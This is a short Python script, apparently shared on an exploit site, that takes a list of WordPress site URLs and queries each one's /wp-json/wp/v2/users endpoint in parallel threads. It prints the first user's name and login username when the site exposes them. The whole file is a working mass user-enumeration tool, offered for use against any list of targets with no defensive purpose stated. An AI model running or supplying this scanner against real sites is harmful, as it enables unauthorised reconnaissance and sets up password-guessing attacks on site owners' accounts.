#python 3.7.1
#www.nyamuxpl0it.cf | N4ST4R_ID

import threading
import requests
import json

def coek(g):
  try:
    test = (g+"/wp-json/wp/v2/users")
    d = requests.get(test)
    e = d.text
    f = json.loads(e)
    if d.status_code == 200:
      print("[*] "+g)
      if 'Sorry, you are not allowed to list users' in e:
        print("[-] Not allowed to see list users\n")
      else:
        name = f[0]["name"]
        uname = f[0]["slug"]
        print("[+] Name     : "+name)
        print("[+] Username : "+uname+"\n")
    else:
      print("[*] "+g+"\n[-] Cannot get users\n")
  except json.decoder.JSONDecodeError:
    print("[*] "+g+"\n[-] Can't get users\n")
  except KeyboardInterrupt:
    print("[!] CTRL+C DETECTED")

if __name__ == '__main__':
  try:
    a = input("[!] Input your list => ")
    b = open(a, "r").readlines()
    for i in b:
      c = i.strip()
      n4 = threading.Thread(target=coek, args=(c,))
      n4.start()
  except FileNotFoundError:
    print("[!] File "+a+" not found bos!")
  except KeyboardInterrupt:
    print("[!] CTRL+C DETECTED")